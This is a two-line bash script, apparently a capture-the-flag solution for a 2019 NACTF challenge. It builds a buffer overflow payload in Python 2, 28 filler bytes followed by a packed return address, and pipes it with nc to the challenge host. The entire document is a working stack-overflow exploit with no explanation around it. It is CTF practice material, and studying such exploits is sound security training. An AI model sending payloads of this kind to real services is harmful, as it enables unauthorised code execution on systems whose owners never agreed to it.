#!/bin/bash

python -c "import struct; print 'a'*28 + struct.pack('<I',0x080491b2)" | nc shell.2019.nactf.com 31462
